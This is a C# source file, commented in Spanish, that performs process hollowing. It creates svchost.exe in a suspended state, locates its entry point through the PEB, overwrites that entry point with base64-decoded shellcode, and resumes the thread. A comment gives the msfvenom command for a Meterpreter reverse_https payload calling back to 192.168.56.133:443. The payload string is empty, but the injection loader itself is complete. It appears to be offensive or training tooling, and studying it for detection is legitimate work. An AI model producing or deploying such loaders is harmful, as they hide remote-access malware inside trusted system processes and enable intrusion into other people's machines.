using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ProcessHollowingSimple
{
    class Program
    {
        #region CreateProcess
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
          public int nLength;
          public unsafe byte* lpSecurityDescriptor;
          public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
          public Int32 cb;
          public string lpReserved;
          public string lpDesktop;
          public string lpTitle;
          public Int32 dwX;
          public Int32 dwY;
          public Int32 dwXSize;
          public Int32 dwYSize;
          public Int32 dwXCountChars;
          public Int32 dwYCountChars;
          public Int32 dwFillAttribute;
          public Int32 dwFlags;
          public Int16 wShowWindow;
          public Int16 cbReserved2;
          public IntPtr lpReserved2;
          public IntPtr hStdInput;
          public IntPtr hStdOutput;
          public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
          public IntPtr hProcess;
          public IntPtr hThread;
          public int dwProcessId;
          public int dwThreadId;
        }
        #endregion

        #region NtQueryInformationProcess
        private enum PROCESSINFOCLASS
        {
            ProcessBasicInformation = 0x00,
            ProcessQuotaLimits = 0x01,
            ProcessIoCounters = 0x02,
            ProcessVmCounters = 0x03,
            ProcessTimes = 0x04,
            ProcessBasePriority = 0x05,
            ProcessRaisePriority = 0x06,
            ProcessDebugPort = 0x07,
            ProcessExceptionPort = 0x08,
            ProcessAccessToken = 0x09,
            ProcessLdtInformation = 0x0A,
            ProcessLdtSize = 0x0B,
            ProcessDefaultHardErrorMode = 0x0C,
            ProcessIoPortHandlers = 0x0D,
            ProcessPooledUsageAndLimits = 0x0E,
            ProcessWorkingSetWatch = 0x0F,
            ProcessUserModeIOPL = 0x10,
            ProcessEnableAlignmentFaultFixup = 0x11,
            ProcessPriorityClass = 0x12,
            ProcessWx86Information = 0x13,
            ProcessHandleCount = 0x14,
            ProcessAffinityMask = 0x15,
            ProcessPriorityBoost = 0x16,
            ProcessDeviceMap = 0x17,
            ProcessSessionInformation = 0x18,
            ProcessForegroundInformation = 0x19,
            ProcessWow64Information = 0x1A,
            ProcessImageFileName = 0x1B,
            ProcessLUIDDeviceMapsEnabled = 0x1C,
            ProcessBreakOnTermination = 0x1D,
            ProcessDebugObjectHandle = 0x1E,
            ProcessDebugFlags = 0x1F,
            ProcessHandleTracing = 0x20,
            ProcessIoPriority = 0x21,
            ProcessExecuteFlags = 0x22,
            ProcessResourceManagement = 0x23,
            ProcessCookie = 0x24,
            ProcessImageInformation = 0x25,
            ProcessCycleTime = 0x26,
            ProcessPagePriority = 0x27,
            ProcessInstrumentationCallback = 0x28,
            ProcessThreadStackAllocation = 0x29,
            ProcessWorkingSetWatchEx = 0x2A,
            ProcessImageFileNameWin32 = 0x2B,
            ProcessImageFileMapping = 0x2C,
            ProcessAffinityUpdateMode = 0x2D,
            ProcessMemoryAllocationMode = 0x2E,
            ProcessGroupInformation = 0x2F,
            ProcessTokenVirtualizationEnabled = 0x30,
            ProcessConsoleHostProcess = 0x31,
            ProcessWindowInformation = 0x32,
            ProcessHandleInformation = 0x33,
            ProcessMitigationPolicy = 0x34,
            ProcessDynamicFunctionTableInformation = 0x35,
            ProcessHandleCheckingMode = 0x36,
            ProcessKeepAliveCount = 0x37,
            ProcessRevokeFileHandles = 0x38,
            ProcessWorkingSetControl = 0x39,
            ProcessHandleTable = 0x3A,
            ProcessCheckStackExtentsMode = 0x3B,
            ProcessCommandLineInformation = 0x3C,
            ProcessProtectionInformation = 0x3D,
            ProcessMemoryExhaustion = 0x3E,
            ProcessFaultInformation = 0x3F,
            ProcessTelemetryIdInformation = 0x40,
            ProcessCommitReleaseInformation = 0x41,
            ProcessDefaultCpuSetsInformation = 0x42,
            ProcessAllowedCpuSetsInformation = 0x43,
            ProcessSubsystemProcess = 0x44,
            ProcessJobMemoryInformation = 0x45,
            ProcessInPrivate = 0x46,
            ProcessRaiseUMExceptionOnInvalidHandleClose = 0x47,
            ProcessIumChallengeResponse = 0x48,
            ProcessChildProcessInformation = 0x49,
            ProcessHighGraphicsPriorityInformation = 0x4A,
            ProcessSubsystemInformation = 0x4B,
            ProcessEnergyValues = 0x4C,
            ProcessActivityThrottleState = 0x4D,
            ProcessActivityThrottlePolicy = 0x4E,
            ProcessWin32kSyscallFilterInformation = 0x4F,
            ProcessDisableSystemAllowedCpuSets = 0x50,
            ProcessWakeInformation = 0x51,
            ProcessEnergyTrackingState = 0x52,
            ProcessManageWritesToExecutableMemory = 0x53,
            ProcessCaptureTrustletLiveDump = 0x54,
            ProcessTelemetryCoverage = 0x55,
            ProcessEnclaveInformation = 0x56,
            ProcessEnableReadWriteVmLogging = 0x57,
            ProcessUptimeInformation = 0x58,
            ProcessImageSection = 0x59,
            ProcessDebugAuthInformation = 0x5A,
            ProcessSystemResourceManagement = 0x5B,
            ProcessSequenceNumber = 0x5C,
            ProcessLoaderDetour = 0x5D,
            ProcessSecurityDomainInformation = 0x5E,
            ProcessCombineSecurityDomainsInformation = 0x5F,
            ProcessEnableLogging = 0x60,
            ProcessLeapSecondInformation = 0x61,
            ProcessFiberShadowStackAllocation = 0x62,
            ProcessFreeFiberShadowStackAllocation = 0x63,
            MaxProcessInfoClass = 0x64
        };

        private struct PROCESS_BASIC_INFORMATION
        {
            public uint ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }
        #endregion

        #region NtCreateSection

        /// <summary>Win32 constants</summary>
        internal const int SECTION_MAP_WRITE = 0x0002;
        /// <summary>Win32 constants</summary>
        internal const int SECTION_MAP_READ = 0x0004;
        /// <summary>Win32 constants</summary>
        internal const int SECTION_MAP_EXECUTE = 0x0008;
        #endregion

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
           string lpApplicationName,
           string lpCommandLine,
           ref SECURITY_ATTRIBUTES lpProcessAttributes,
           ref SECURITY_ATTRIBUTES lpThreadAttributes,
           bool bInheritHandles,
           uint dwCreationFlags,
           IntPtr lpEnvironment,
           string lpCurrentDirectory,
           [In] ref STARTUPINFO lpStartupInfo,
           out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("NTDLL.DLL", SetLastError = true)]
        static extern int NtQueryInformationProcess(
            IntPtr hProcess, 
            PROCESSINFOCLASS pic, 
            out PROCESS_BASIC_INFORMATION pbi, 
            int processInformationLength, 
            out int returnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
          IntPtr hProcess,
          IntPtr lpBaseAddress,
          IntPtr lpBuffer,
          Int32 nSize,
          out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref long MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            UIntPtr ZeroBits,
            UIntPtr CommitSize,
            out ulong SectionOffset,
            out uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        public const uint CREATE_SUSPENDED = 0x00000004;

        public const uint PAGE_EXECUTE_READWRITE = 0x40;

        public const uint PAGE_READWRITE = 0x04; 

        public const uint PAGE_EXECUTE_READ = 0x20; 

        public const uint SEC_COMMIT = 0x8000000; 

        static void Main(string[] args)
        {
            // Shellcode
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.133 LPORT=443 EXITFUNC=thread -f csharp 
            byte[] buf = new byte[] { };

            string shellcodeb64 = "";

            buf = null;
            buf = Convert.FromBase64String(shellcodeb64);

            // Variables para la creación del proceso
            // Process Name
            string ProcName = @"C:\Windows\System32\svchost.exe";

            // STARTUPINFO
            STARTUPINFO si = new STARTUPINFO();

            // PROCESS_INFORMATION
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // SECURITY_ATTRIBUTES 
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();

            // Create Process in SUSPENDED Mode (CreateProcess)
            bool status = CreateProcess(null, ProcName, ref pSec, ref tSec, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            Console.WriteLine("[>] Proceso creado en modo suspendido.");
            Console.WriteLine("	| -> Nombre del proceso: " + ProcName);
            Console.WriteLine("	| -> ID del proceso: " + pi.dwProcessId);
            Console.WriteLine("	| -> ID del thread (hilo): " + pi.dwThreadId);

            // Variables para consultar la información del proceso
            // Process Handle
            IntPtr pHandle = pi.hProcess;

            // PROCESS_BASIC_INFORMATION
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();

            // PROCESSINFOCLASS
            PROCESSINFOCLASS pic = new PROCESSINFOCLASS();

            // returnLength
            int returnLength;

            // Obtener la información del proceso para buscar el PEB (NtQueryInformationProcess)
            int resultNtQuery = NtQueryInformationProcess(pHandle, pic, out pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out returnLength);

            Console.WriteLine("\n[>] Informacion del proceso " + ProcName + " obtenida.");
            Console.WriteLine(" | -> PEB: 0x{0:X16}", pbi.PebBaseAddress.ToInt64());

            // Calculo de la ubicación del valor del ImageBaseAddress - WinDBG
            IntPtr ptrImageBase = (IntPtr)((Int64)pbi.PebBaseAddress + 0x10);

            // Variables para guardar el valor de ImageBaseAddress
            // ImageBaseAddress byte
            byte[] ImageBaseAddress = new byte[8];

            // bytesRead 
            IntPtr bytesRead;

            // Leer 8 bytes de memoria en la ubicación del PEB para obtener la dirección del ImageBaseAddress (ReadProcessMemory)
            status = ReadProcessMemory(pHandle, ptrImageBase, ImageBaseAddress, 8, out bytesRead);

            IntPtr ProcessBaseAddr = (IntPtr)BitConverter.ToInt64(ImageBaseAddress, 0);

            Console.WriteLine(" | -> ImageBaseAddress: 0x{0:X16}", ProcessBaseAddr.ToInt64());

            // Variable para almacenar el contenido de la memoria
            byte[] dataPE = new byte[0x200];

            // Leer 512 Bytes de memoria en la ubicación del ImageBaseAddress (ReadProcessMemory)
            status = ReadProcessMemory(pHandle, ProcessBaseAddr, dataPE, dataPE.Length, out bytesRead);

            // Obtener el valor de e_lfanew 
            // 0x3C - Ubicación
            uint e_lfanew = BitConverter.ToUInt32(dataPE, 0x3C);

            // Obtener el valor de opthdr (optional header a partir del e_lfanew)
            // e_lfanew + 0x28
            uint opthdr = e_lfanew + 0x28;

            // Obtener el valor del entrypoint_rva
            uint entrypoint_rva = BitConverter.ToUInt32(dataPE, (int)opthdr);

            // Obtener el valor del AddressOfEntryPoint
            // entrypoint_rva + ImageBaseAddress
            IntPtr addressOfEntryPoint = (IntPtr)((UInt64)ProcessBaseAddr + entrypoint_rva);

            Console.WriteLine(" | -> addressOfEntryPoint: 0x{0:X16}", addressOfEntryPoint.ToInt64());

            // Copiar el shellcode al AddressOfEntryPoint
            IntPtr readbytes;
            WriteProcessMemory(pHandle, addressOfEntryPoint, buf, buf.Length, out readbytes);

            // Resumir el Thread (ResumeThread)
            ResumeThread(pi.hThread);

            Console.ReadLine();
		    }
    }
}
